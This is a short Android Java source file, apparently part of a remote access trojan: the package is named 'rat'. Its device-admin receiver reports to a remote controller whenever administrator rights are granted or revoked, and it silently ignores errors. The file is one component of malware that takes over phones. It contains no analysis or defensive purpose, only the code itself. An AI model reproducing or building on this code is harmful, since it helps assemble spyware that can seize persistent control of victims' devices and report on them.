package com.wexow.rat.admin;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        super.onEnabled(ctx, intent);
        sendStatus(ctx, true);
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        super.onDisabled(ctx, intent);
        sendStatus(ctx, false);
    }

    private void sendStatus(Context ctx, boolean enabled) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "device_admin_status");
            jo.put("enabled", enabled);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }
}